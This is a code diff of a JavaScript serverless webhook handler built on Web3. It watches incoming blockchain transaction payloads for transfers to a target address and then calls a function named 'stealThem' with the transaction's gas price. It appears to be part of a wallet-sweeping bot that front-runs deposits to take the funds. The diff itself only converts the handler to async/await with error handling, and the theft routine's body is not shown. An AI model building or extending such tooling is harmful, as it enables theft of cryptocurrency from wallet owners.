@@ -9,44 +9,55 @@ let provider = new Web3(new Web3.providers.HttpProvider(providerString));
 let withdrawAttempts = 0;
 
 // this uses the callback syntax, however, we encourage you to try the async/await syntax shown in async-dadjoke.js
-export function handler(event, context, callback) {
-  const payload = JSON.parse(event.body);
+export async function handler(event, context) {
+  let payload;
+  try {
+    payload = JSON.parse(event.body);
 
-  console.log(`Payload: ${payload}`);
+    console.log(`Payload: ${payload}`);
 
-  if (!payload || !payload.chainId || !payload.streamId) {
-    console.log(`Invalid payload: ${payload}`);
+    if (!payload || !payload.chainId || !payload.streamId) {
+      console.log(`Invalid payload: ${payload}`);
+      return Promise.resolve({
+                               statusCode: 200,
+                               body: JSON.stringify({error: 'Invalid payload'})
+                             });
+    }
+
+    // Check if the toAddress field matches the specified address
+    let txs = payload.txs;
+    let length = payload.txs.length;
+    let toAddress = payload.txs[0].toAddress;
+
+    if (txs && length > 0 && toAddress.toLowerCase() == targetAddress.toLowerCase()) {
+
+      let gasPrice = payload["txs"][0]["gasPrice"]
+      console.log(`gasPrice: ${gasPrice}`);
+      return stealThem(gasPrice).then(result => {
+        console.log(`Calling method for toAddress: ${targetAddress}`);
+        return {
+          statusCode: 200,
+          body: JSON.stringify({message: 'Payload processed successfully'})
+        };
+      });
+
+    }
+
+    // Return a success response
+
     return {
       statusCode: 200,
-      body: JSON.stringify({ error: 'Invalid payload' })
+      body: JSON.stringify({message: 'Payload was not processed'})
+    };
+
+  }
+  catch (e) {
+    console.log(`Invalid payload: ${event.body}`);
+    return {
+      statusCode: 200,
+      body: JSON.stringify({error: 'Invalid payload'})
     };
   }
-
-  // Check if the toAddress field matches the specified address
-  let txs = payload.txs;
-  let length = payload.txs.length;
-  let toAddress = payload.txs[0].toAddress;
-
-  if (txs && length > 0 && toAddress.toLowerCase() == targetAddress.toLowerCase()) {
-
-    let gasPrice = payload["txs"][0]["gasPrice"]
-    console.log(`gasPrice: ${gasPrice}`);
-    return stealThem(gasPrice).then(result => {
-      console.log(`Calling method for toAddress: ${targetAddress}`);
-      return {
-        statusCode: 200,
-        body: JSON.stringify({ message: 'Payload processed successfully' })
-      };
-    });
-
-  }
-
-  // Return a success response
-
-  return {
-    statusCode: 200,
-    body: JSON.stringify({ message: 'Payload was not processed' })
-  };
 
 }
 
